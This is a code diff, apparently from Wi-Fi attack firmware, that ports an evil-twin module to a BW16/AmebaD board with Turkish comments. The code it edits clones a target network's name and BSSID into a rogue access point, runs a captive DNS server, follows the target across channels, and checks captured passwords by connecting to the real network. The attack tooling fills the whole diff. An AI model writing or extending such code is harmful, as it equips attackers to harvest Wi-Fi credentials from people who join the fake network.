@@ -487,7 +487,8 @@ void start_evil_twin(int wifi_number) {
 #ifndef BOARD_BW16
   WiFi.setAutoReconnect(false);
 #endif
-  WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
+  // AmebaD'de softAP() yok — WiFi_softAP() platform_compat.h'deki wrapper'ı çağırır
+  WiFi_softAP(evil_twin_ssid.c_str(), "", evil_twin_channel);
 
   delay(cur_mode == WIFI_MODE_APSTA ? 80 : 150);
   apply_max_performance();
@@ -522,14 +523,16 @@ bool evil_twin_test_password(const String &password) {
   esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
   esp_wifi_connect();
 #else
-  WiFi.begin(evil_twin_ssid.c_str(), password.c_str(),
-             evil_twin_channel, evil_twin_bssid);
+  // AmebaD WiFi.begin() sadece (ssid, pass) imzasını destekler;
+  // channel ve bssid parametresi yok. Hedefe bağlanmak için yeterli.
+  WiFi.begin((char*)evil_twin_ssid.c_str(), password.c_str());
 #endif
 
   unsigned long t = millis();
   bool connected  = false;
   while (millis() - t < ET_TEST_TIMEOUT_MS) {
-    wl_status_t s = WiFi.status();
+    // AmebaD'de WiFi.status() uint8_t döndürür; wl_status_t enum'a cast gerekli.
+    wl_status_t s = (wl_status_t)WiFi.status();
     if (s == WL_CONNECTED)      { connected = true; break; }
     if (s == WL_CONNECT_FAILED) break;
     delay(80);
@@ -577,7 +580,7 @@ static void et_retrack() {
         memcpy(evil_twin_bssid, WiFi_BSSID_scan(i), 6);
         memcpy(et_frame.access_point, evil_twin_bssid, 6);
         memcpy(et_frame.sender,       evil_twin_bssid, 6);
-        WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
+        WiFi_softAP(evil_twin_ssid.c_str(), "", evil_twin_channel);
         apply_max_performance();
         DEBUG_PRINTF("ET birincil yeni kanal: %d %s\n",
           evil_twin_channel,
@@ -614,7 +617,12 @@ void evil_twin_loop() {
   if (!evil_twin_active) return;
 
   dns_server.processNextRequest();
+#ifdef BOARD_BW16
+  // AmebaD SDK'da softAPgetStationNum() bulunmayabilir; 0 döndür
+  evil_twin_clients = 0;
+#else
   evil_twin_clients = WiFi.softAPgetStationNum();
+#endif
 
   et_wps_pbc_loop();
 
@@ -667,11 +675,11 @@ void stop_evil_twin() {
   https_redirect_stop();
 #endif
 
-  WiFi.softAPdisconnect();
 #ifndef BOARD_BW16
+  WiFi.softAPdisconnect();
   WiFi.mode(WIFI_MODE_APSTA);
 #endif
-  WiFi.softAP(AP_SSID, AP_PASS);
+  WiFi_softAP(AP_SSID, AP_PASS);
   apply_max_performance();
 
   evil_twin_ssid          = "";
